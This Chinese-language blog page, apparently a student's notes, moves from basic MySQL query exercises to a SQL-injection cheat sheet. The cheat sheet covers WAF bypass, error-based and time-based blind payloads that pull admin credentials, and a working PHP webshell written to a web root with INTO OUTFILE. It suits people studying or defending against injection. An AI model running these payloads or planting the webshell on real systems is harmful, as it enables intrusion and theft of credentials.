@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="第五节：mysql学习基础练习 查询Student表中的所有记录的Sname、Ssex和Class列。      查询教师所有的单位即不重复的Depart列。      查询Student表的所有记录。      查询Score表中成绩在60到80之间的所有记录。      查询Score表中成绩为85，86或88的记录。      查询Student表中“95031”班或性别为“女”的同学记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL学习">
+<meta property="og:url" content="http://yoursite.com/2018/12/10/mysql学习/index.html">
+<meta property="og:site_name" content="ZouKba">
+<meta property="og:description" content="第五节：mysql学习基础练习 查询Student表中的所有记录的Sname、Ssex和Class列。      查询教师所有的单位即不重复的Depart列。      查询Student表的所有记录。      查询Score表中成绩在60到80之间的所有记录。      查询Score表中成绩为85，86或88的记录。      查询Student表中“95031”班或性别为“女”的同学记录。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-24f51bbe0ededfa9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-fb05f8404a05e044.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-56e9993e3530ec51.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-a8a7ab61291bc0b0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-d419e85055261317.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-b72b5b8fcc9d8f6b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-868c7058fba59aba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-08b5cfad50bc3b26.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-3acf01bf4f18c4b5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-33f8ce749d8ae9b5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-c35a54f7affc6f18.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-7d28b40fbae0dc62.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-848db63ce74aa10d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-19T09:01:06.146Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL学习">
+<meta name="twitter:description" content="第五节：mysql学习基础练习 查询Student表中的所有记录的Sname、Ssex和Class列。      查询教师所有的单位即不重复的Depart列。      查询Student表的所有记录。      查询Score表中成绩在60到80之间的所有记录。      查询Score表中成绩为85，86或88的记录。      查询Student表中“95031”班或性别为“女”的同学记录。">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11457450-24f51bbe0ededfa9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZouKba" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/10/mysql学习/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>MySQL学习 | ZouKba</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZouKba</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">别偷懒</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">14</span></a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/10/mysql学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zoukba">
+      <meta itemprop="description" content="阿里我来了">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZouKba">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MySQL学习
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-10 16:47:52" itemprop="dateCreated datePublished" datetime="2018-12-10T16:47:52+08:00">2018-12-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-12-19 17:01:06" itemprop="dateModified" datetime="2018-12-19T17:01:06+08:00">2018-12-19</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="第五节：mysql学习"><a href="#第五节：mysql学习" class="headerlink" title="第五节：mysql学习"></a>第五节：mysql学习</h1><h2 id="基础练习"><a href="#基础练习" class="headerlink" title="基础练习"></a>基础练习</h2><ol>
+<li>查询Student表中的所有记录的Sname、Ssex和Class列。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-24f51bbe0ededfa9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"></li>
+</ul>
+<ol start="2">
+<li>查询教师所有的单位即不重复的Depart列。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-fb05f8404a05e044.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"></li>
+</ul>
+<ol start="3">
+<li>查询Student表的所有记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-56e9993e3530ec51.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"></li>
+</ul>
+<ol start="4">
+<li>查询Score表中成绩在60到80之间的所有记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-a8a7ab61291bc0b0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"></li>
+</ul>
+<ol start="5">
+<li>查询Score表中成绩为85，86或88的记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-d419e85055261317.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"></li>
+</ul>
+<ol start="6">
+<li>查询Student表中“95031”班或性别为“女”的同学记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-b72b5b8fcc9d8f6b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"></li>
+</ul>
+<ol start="7">
+<li>以Class降序查询Student表的所有记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-868c7058fba59aba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></li>
+</ul>
+<ol start="8">
+<li>以Cno升序、Degree降序查询Score表的所有记录。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-08b5cfad50bc3b26.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.PNG"></li>
+</ul>
+<ol start="9">
+<li>查询“95031”班的学生人数。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-3acf01bf4f18c4b5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.PNG"></li>
+</ul>
+<ol start="10">
+<li>查询Score表中的最高分的学生学号和课程号。（子查询或者排序）</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-33f8ce749d8ae9b5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.PNG"></li>
+</ul>
+<ol start="11">
+<li>查询每门课的平均成绩。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-c35a54f7affc6f18.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<ol start="12">
+<li>查询Score表中至少有5名学生选修的并以3开头的课程的平均分数。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-7d28b40fbae0dc62.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.PNG"></li>
+</ul>
+<ol start="13">
+<li>查询分数大于70，小于90的Sno列。</li>
+</ol>
+<ul>
+<li><img src="https://upload-images.jianshu.io/upload_images/11457450-848db63ce74aa10d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.PNG"></li>
+</ul>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">distinct                              //列出不同（distinct）的值</span><br><span class="line">as total                             //将操作后的数据当作一个total表</span><br><span class="line">group by                           //用于结合合计函数，根据一个或多个列对结果集进行分组</span><br><span class="line">having                              //在 SQL 中增加 HAVING 子句原因是，WHERE 关键字无法与合计函数一起使用</span><br></pre></td></tr></table></figure>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol>
+<li><p>下面是注入mysql时经常会用到的一些单行函数,熟练使用是灵活注入的前提,尤其是在对抗一些waf的时候</p>
+<p> 字符串连接函数,将多个字符串连接成一个字符串,注意,中间只要字符串有一个为空,最后结果也为空</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,str3...)</span><br><span class="line">mysql&gt; select concat(id, &apos; | &apos;, username,&apos; | &apos;,password) from admin limit 0,1;</span><br><span class="line">mysql&gt; select concat(username,&apos; | &apos;,password,null) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>同样是连接多个字符串,但可以在开头指定分隔符,跟concat()稍微不同,它会自动忽略中间的空值,只有分隔</p>
+<p> 符为空,整体才返回空</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(‘指定分隔符’,str1,str2,str3...)</span><br><span class="line">mysql&gt; select concat_ws(&apos; # &apos;,username,password) from admin limit 0,1;</span><br><span class="line">mysql&gt; select concat_ws(&apos; # &apos;,username,password,null) from admin limit 0,1;</span><br><span class="line">mysql&gt; select concat_ws(null,username,password,null) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用分组的方式连接所有字符串,通俗点儿讲,其实就是把某个字段下的所有数据全部连接成一个字符串,注</p>
+<p> 意有长度限制,默认1024</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">group_concat(field_username1, field_username2, field_username3...)</span><br><span class="line">mysql&gt; show variables like &quot;group_concat_max_len&quot;;</span><br><span class="line">mysql&gt; select group_concat(username) from admin;</span><br><span class="line">mysql&gt; select group_concat(concat_ws(&apos; # &apos;,username,password)) from admin;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>截取指定字符串,注意在mysql中的所有字符串截取操作[除了limit],默认都是从1开始的,并非像代码中的数组</p>
+<p> 是从0开始的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substring(要截取的字符串,从什么地方开始截取,截取多长)</span><br><span class="line">mysql&gt; select substring((select username from admin limit 0,1),1,1);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>截取指定字符串,具体用法基本同substring()<br> substr(要截取的字符串,从什么地方开始截取,截取多长)</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr((select username from admin limit 0,1),1,1);</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li><p>mysql 专有的字符串截取,也就是说只有在mysql中有,mssql和oracle以及pgsql中都没有</p>
+<p>  mid(要截取的字符串,从什么地方开始截取,截取多长)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(username,1,1) from admin;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从左往右截取3个字符,左截取</p>
+<p> left(str,3)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(username,3) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从右往左截取3个字符,右截取</p>
+<p> right()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(username,3) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>返回一个字符串在另一个字符串中第一次出现的位置,可尝试配合上面的字符串截取函数在读取文件时用</p>
+<p> locate()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select locate(username,&apos;yikongjianadmin&apos;) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>返回指定的ASCII码字符所对应的数值,下面的ord()用法基本也是一致的</p>
+<p>   ascii(单个字符) ord(单个字符)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii((select mid(username,1,1) from admin limit 0,1));</span><br><span class="line">mysql&gt; select ord((select mid(username,1,1) from admin limit 0,1));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>把指定的数字转换成对应的ASCII码字符,n久以前 bypasswaf的惯用招数,各类编码绕过waf也是最常见的 </p>
+<p> 一种方式</p>
+<p>char(num)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select char(mid(id,1,4)) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符串替换,在读取文件时,我们可能需要用到replace()替换一些特殊字符</p>
+<p>   replace(字段名,要替换的字符串,准备替换为的字符)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select replace((select username from admin limit 0,1),&apos;admin&apos;,&apos;yikongjian&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取整函数和四舍五入函数,比如,经典的显错注入,利用的就是rand + group by/order by的显错特性,mysql官</p>
+<p>  方文档已明确指出,rand和oderby / group by 不能共用,否则数据库会提示 ‘ERROR 1062 (23000): </p>
+<p>  Duplicate entry’类的错误,但作为渗透者的我们想要的却恰恰是这个错误,嘿嘿……</p>
+<p>  floor()  rand() </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(&apos; # &apos;,database(),&apos; # &apos;,user(),&apos; # &apos;,version())))a from information_schema.tables group by a)b;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>统计某个字段下的某条数据的字符总长度</p>
+<p>   length(field_username)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(username) from admin limit 0,1;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>统计某个表下总共有多少条记录</p>
+<p>  count(*)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from admin;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进制转换函数,16进制转换,导出udf的时候可能会用到</p>
+<p>  hex() unhex() </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(mid((select username from admin limit 0,1),1,1));</span><br><span class="line">mysql&gt; select unhex(hex(mid((select username from admin limit 0,1),1,1)));</span><br><span class="line">conv(num,from_base,to_base) 经常会用来绕过某些编码过滤</span><br><span class="line">mysql&gt; select conv(11,10,16);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>两个操作xml数据的函数,通常我们可以利用这种特性一句话就把所有的数据全部查出来,显错注入常用</p>
+<p>  extractvalue(xml_doc,xpath) 意思就是从指定xml文档中查询指定的字符串</p>
+<p>  updatexml(xml_doc,xpath,new_value) 利用xpath把xml文档中的指定字符串替换成新值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(SELECT concat(username,&apos;|&apos;,password) FROM admin limit 0,1)));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>username_const()只在mysql内部使用, 服务器在书写来自包含局部程序变量的存储程序的语句时会用到</p>
+<p>  它,我们通常用它来显错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username_const(built_username,value)</span><br><span class="line">mysql&gt;  select username_const(version(),1);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符串填充,跟代码中的字符串填充是一个意思,注意,如果被填充的位置原来有数据则会被直接覆盖,我们可</p>
+<p>  利用这种方式来查数据</p>
+<p>  rpad() lpad()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(&apos;hello &apos;,10,&apos;#&apos;);</span><br><span class="line">mysql&gt; select rpad(&apos;hello &apos;,10,&apos;#&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>时间盲注最常用的两个函数</p>
+<p>  benchmark(count,expr) 性能测试函数,意思就是执行expr count次</p>
+<p>  sleep(second)    定时休眠函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select benchmark(1000000000,(select sha(&apos;admin&apos;)));</span><br><span class="line">mysql&gt; select * from admin where username=&apos;admin&apos; and sleep(5);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>大小写转换,有时候为了减少我们的手工劳动量,可能就需要用到这种转换函数,尽可能的帮我们缩小范围</p>
+<p>  lower() upper()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lower(conv(11,10,16));</span><br><span class="line">mysql&gt; select upper(conv(45,10,16));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用判断特性,常配合时间盲注一起使用</p>
+</li>
+</ol>
+<p>if()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if((select 4,\N) &gt; (select 2,\N),30,20);</span><br></pre></td></tr></table></figure></p>
+<ol start="23">
+<li><p>相当于sql中的’switch’语句,有兴趣可以把sqlmap的调试模式开起来,实际跑的时候你会看到大量类似的语句</p>
+<p>   case when end</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case when 1&gt;0 then &apos;yeah! login succeed!&apos; else &apos;no failed&apos; end;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rlike() 天然的sql模糊匹配,常规的like则需要带上通配符[只匹配指定字段]</p>
+<p>  rlike()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username rlike &apos;ad&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用正则查询数据,实战中还是非常好用的</p>
+<p>   regexp()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username regexp &apos;ad&apos; order by id;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>几个读写文件的函数,写webshell,读账号密码会经常用到</p>
+<p>  原型一句话代码是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sl = create_function(&apos;&apos;, @$_REQUEST[&apos;yikongjian&apos;]);$sl();?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>16进制后的效果是这样的,因为里面一些特殊字符的原因,实战中最好编码下,不然可能写不进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3c3f7068702024736c203d206372656174655f66756e6374696f6e2827272c2040245f524551554553545b2779696b6f6e676a69616e275d293b24736c28293b3f3e</span><br></pre></td></tr></table></figure>
+<p>  尝试写webshell,务必要先保证你要写的目标目录确实能写才行,不然也是写不进去的</p>
+<p>   select * into outfile     普通文本文件是没什么问题</p>
+<p>   select * into dumpfile 如果是dll,so,exe,必须二进制写,尝试导出udf时可能会用到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;0x3c3f7068702024736c203d206372*******&apos; into outfile &apos;/var/www/html/hell.php&apos;;</span><br></pre></td></tr></table></figure>
